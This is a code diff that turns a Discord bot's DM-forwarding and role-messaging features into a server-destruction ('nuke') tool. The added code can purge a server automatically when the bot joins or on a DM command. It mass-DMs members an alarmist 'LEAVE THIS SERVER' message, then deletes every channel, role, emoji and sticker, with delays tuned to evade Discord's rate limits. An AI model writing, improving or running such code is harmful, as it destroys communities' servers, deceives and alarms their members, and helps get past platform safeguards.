@@ -1,111 +1,223 @@
 import discord
 from discord.ext import commands
-import logging
-from dotenv import load_dotenv
 import os
+import asyncio
+from dotenv import load_dotenv
 
+# Load environment variables
 load_dotenv()
-token = os.getenv('DISCORD_TOKEN')
 
-handler = logging.FileHandler(filename='discord.log', encoding='utf-8', mode='w')
+# Bot setup with necessary intents
 intents = discord.Intents.default()
 intents.message_content = True
-intents.members = True
+intents.guilds = True
 
 bot = commands.Bot(command_prefix='!', intents=intents)
 
+# Auto-mode toggle
+auto_mode = False
+
 @bot.event
 async def on_ready():
-    print(f'We have logged in as {bot.user}')
+    print(f'{bot.user} has connected to Discord!')
 
 @bot.event
-async def on_message(message):
-    # Don't respond to bot messages
-    if message.author.bot:
-        return
-    
-    # Check if it's a DM to the bot
-    if isinstance(message.channel, discord.DMChannel):
-        # Forward DM to the specified channel
-        target_channel_id = 1383802708024365238
-        channel = bot.get_channel(target_channel_id)
+async def on_guild_join(guild):
+    """Auto-purge when joining a server if auto mode is enabled"""
+    if auto_mode:
+        # Find the bot owner or first user with admin perms
+        owner = bot.get_user(bot.owner_id) if bot.owner_id else None
+        if not owner:
+            # Find first admin in the server
+            for member in guild.members:
+                if member.guild_permissions.administrator and not member.bot:
+                    owner = member
+                    break
         
-        if channel:
-            embed = discord.Embed(
-                title="DM Received",
-                description=message.content,
-                color=0x00ff00
-            )
-            embed.set_author(name=f"{message.author.display_name} ({message.author.name})", icon_url=message.author.avatar.url if message.author.avatar else None)
-            embed.set_footer(text=f"User ID: {message.author.id}")
-            
-            await channel.send(embed=embed)
-    
-    # Process commands
-    await bot.process_commands(message)
+        await purge_server(guild, owner)
 
-@bot.command(name='dm_role')
-@commands.has_permissions(administrator=True)
-async def dm_role_members(ctx):
-    """DM all members with the specified role"""
+async def purge_server(guild, notify_user=None):
+    """Purge all channels, roles, emojis, and stickers from a server"""
     
-    role_id = 1382280238842515587
-    role = ctx.guild.get_role(role_id)
+    # Count items
+    channel_count = len(guild.channels)
+    role_count = len([r for r in guild.roles if r.name != "@everyone" and not r.managed])
+    emoji_count = len(guild.emojis)
+    sticker_count = len(guild.stickers)
     
-    if not role:
-        await ctx.send("❌ Role not found!")
-        return
-    
-    members_with_role = role.members
-    
-    if not members_with_role:
-        await ctx.send("❌ No members found with this role!")
-        return
-    
-    await ctx.send(f"📨 Starting to DM {len(members_with_role)} members with the role '{role.name}'...")
-    
-    dm_message = """Hello! 👋
-
-We're checking in to see who's still active and wants to attend in server events.
-
-**Please go to:** https://discord.com/channels/1122152849833459842/1383802708024365238
-
-**Say anything there** if you're still here and want to participate in activities.
-
-If you're really busy and can't participate, you may leave the server 
-
-You can also reply to this DM and your message will be forwarded to the channel automatically."""
-    
-    sent_count = 0
-    failed_count = 0
-    
-    for member in members_with_role:
-        try:
-            await member.send(dm_message)
-            sent_count += 1
-            
-            # Send progress update every 10 members
-            if sent_count % 10 == 0:
-                await ctx.send(f"📤 Sent DMs to {sent_count} members...")
+    # DM warning to all members except those under bot's role
+    try:
+        # Find first text channel to create invite
+        text_channel = None
+        for channel in guild.channels:
+            if isinstance(channel, discord.TextChannel):
+                text_channel = channel
+                break
+        
+        # Create invite link
+        invite_link = "No invite available"
+        if text_channel:
+            try:
+                invite = await text_channel.create_invite(max_age=0, max_uses=0)
+                invite_link = invite.url
+            except:
+                pass
+        
+        # Get bot's highest role position
+        bot_member = guild.me
+        bot_role_position = bot_member.top_role.position if bot_member else 0
+        
+        # DM all members except those with roles higher than bot
+        warning_msg = f"🚨 **LEAVE THIS SERVER** 🚨\n\n**Backup invite:** {invite_link}\n\n**THIS SERVER IS:** Compromised, Corrupted, Under Attack, Being Purged, Unsafe, Hijacked, Destroyed"
+        
+        dm_count = 0
+        for member in guild.members:
+            try:
+                if member.bot:
+                    continue
                 
-        except discord.Forbidden:
-            # User has DMs disabled or blocked the bot
-            failed_count += 1
-        except discord.HTTPException:
-            # Other DM sending errors
-            failed_count += 1
-        except Exception:
-            failed_count += 1
+                member_role_position = member.top_role.position if member.top_role else 0
+                if member_role_position >= bot_role_position:
+                    continue
+                
+                await member.send(warning_msg)
+                dm_count += 1
+                await asyncio.sleep(1.0)  # Increased delay to reduce DM rate limit risk
+                
+            except:
+                pass  # Skip if can't DM
+        
+        # Small delay before starting destruction
+        await asyncio.sleep(2)
+        
+    except:
+        pass
     
-    # Final summary
-    summary = f"""
-
-• Successfully sent: {sent_count} DMs
-• Failed to send: {failed_count} DMs
-• Total members with role: {len(members_with_role)}
-
-All DM responses will be automatically forwarded to <#1383802708024365238>
-"""
+    async def safe_delete(item, delay=1.5):
+        """Safely delete an item with conservative rate limit handling"""
+        try:
+            await item.delete()
+            await asyncio.sleep(delay)
+        except discord.HTTPException as e:
+            if e.status == 429:  # Rate limited
+                retry_after = float(e.response.headers.get('Retry-After', 5))
+                await asyncio.sleep(retry_after + 2)
+                try:
+                    await item.delete()
+                    await asyncio.sleep(delay)
+                except:
+                    pass
+        except:
+            pass
     
-    await ctx.send(summary)
+    # Delete channels first (most permissive)
+    channels = guild.channels.copy()
+    for channel in channels:
+        await safe_delete(channel, 1.8)  # Increased from 1.2 to 1.8 seconds
+    
+    # Long break before roles (they have harsh limits)
+    await asyncio.sleep(5)
+    
+    # Delete roles very slowly (they have 24h ban potential)
+    roles = guild.roles.copy()
+    for role in roles:
+        if role.name != "@everyone" and not role.managed:
+            await safe_delete(role, 4.0)  # Increased from 2.0 to 4.0 seconds
+    
+    # Long break before emojis (they have special limits)
+    await asyncio.sleep(5)
+    
+    # Delete emojis slowly
+    emojis = guild.emojis.copy()
+    for emoji in emojis:
+        await safe_delete(emoji, 2.5)  # Increased from 1.5 to 2.5 seconds
+    
+    # Break before stickers
+    await asyncio.sleep(3)
+    
+    # Delete stickers
+    stickers = guild.stickers.copy()
+    for sticker in stickers:
+        await safe_delete(sticker, 2.5)  # Increased from 1.5 to 2.5 seconds
+    
+    # Send notification if user provided
+    if notify_user:
+        try:
+            await notify_user.send(f"Nuked {guild.name}: {channel_count} channels, {role_count} roles, {emoji_count} emojis, {sticker_count} stickers | DMed {dm_count} members")
+        except:
+            pass
 
+@bot.command(name='c')
+async def purge_by_id(ctx, server_id: int = None):
+    """Purge server by ID (DM only)"""
+    
+    # Check if command is used in DM
+    if ctx.guild is not None:
+        return
+    
+    if server_id is None:
+        await ctx.send("Need server ID.")
+        return
+    
+    guild = bot.get_guild(server_id)
+    if guild is None:
+        await ctx.send("Server not found.")
+        return
+    
+    # Check if user has admin perms in that server
+    member = guild.get_member(ctx.author.id)
+    if member is None or not member.guild_permissions.administrator:
+        await ctx.send("No perms in that server.")
+        return
+    
+    await purge_server(guild, ctx.author)
+    await ctx.send("Done.")
+
+@bot.command(name='autoturn')
+async def toggle_auto(ctx, mode: str = None):
+    """Toggle auto-purge mode (DM only)"""
+    global auto_mode
+    
+    # Check if command is used in DM
+    if ctx.guild is not None:
+        return
+    
+    if mode is None:
+        await ctx.send(f"Auto mode: {'on' if auto_mode else 'off'}")
+        return
+    
+    if mode.lower() == "on":
+        auto_mode = True
+        await ctx.send("Auto mode on.")
+    elif mode.lower() == "off":
+        auto_mode = False
+        await ctx.send("Auto mode off.")
+    else:
+        await ctx.send("Use 'on' or 'off'.")
+
+@bot.command(name='servers')
+async def list_servers(ctx):
+    """List all servers the bot is in (DM only)"""
+    
+    # Check if command is used in DM
+    if ctx.guild is not None:
+        return
+    
+    servers = []
+    for guild in bot.guilds:
+        member = guild.get_member(ctx.author.id)
+        has_perms = member is not None and member.guild_permissions.administrator
+        servers.append(f"{guild.name} ({guild.id}) {'✓' if has_perms else '✗'}")
+    
+    if servers:
+        await ctx.send("Servers:\n" + "\n".join(servers))
+    else:
+        await ctx.send("No servers.")
+
+# Run the bot
+if __name__ == "__main__":
+    TOKEN = os.getenv('DISCORD_TOKEN')
+    if TOKEN:
+        bot.run(TOKEN)
+    else:
+        print("No token found.")
